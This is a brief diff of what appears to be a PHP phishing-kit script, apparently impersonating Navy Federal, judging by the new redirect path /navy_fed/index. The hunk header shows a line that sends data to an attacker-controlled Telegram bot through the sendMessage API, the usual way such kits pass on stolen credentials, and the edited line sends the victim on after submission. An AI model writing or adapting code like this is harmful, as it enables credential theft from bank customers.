@@ -47,6 +47,6 @@ file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$c
 
 
 
-header("Location: /index");
+header("Location: /navy_fed/index");
 
 ?>
